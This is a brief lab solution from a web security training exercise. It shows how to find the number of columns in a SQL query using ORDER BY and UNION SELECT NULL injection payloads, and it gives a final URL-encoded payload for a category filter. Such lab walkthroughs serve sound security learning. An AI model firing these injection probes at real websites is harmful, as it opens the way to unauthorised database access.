# Lab: SQL injection UNION attack, determining the number of columns returned by the query (Practitioner)

**Goal:** Determine the number of columns returned by the query and confirm with a UNION attack.

## Solution

1. Intercept a request with a category filter, e.g. `/filter?category=Gifts`
2. Determine the number of columns using `ORDER BY` or `UNION SELECT NULL`:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

When it errors, the previous number is the column count.

Alternatively (preferred):

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Find the highest number of NULLs that does not cause an error.

In this lab it is typically **3 columns**.

## Final Payload (example for 3 columns)

```
' UNION SELECT NULL,NULL,NULL--
```

Full:

```
/filter?category='+UNION+SELECT+NULL,NULL,NULL--
```
